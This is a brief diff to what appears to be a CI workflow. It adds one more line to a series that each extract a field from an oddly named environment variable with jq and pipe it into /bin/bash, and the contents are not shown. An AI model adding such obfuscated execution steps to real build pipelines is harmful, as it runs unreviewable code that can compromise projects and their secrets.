@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$w8" | jq -r .m43486 | /bin/bash
           echo $awax11 | jq -r .h1 | /bin/bash
           echo $d1515 | jq -r .fdty959 | /bin/bash
+          echo $ig9045 | jq -r .xne0 | /bin/bash
 
       - name: Persist output
         if: always()
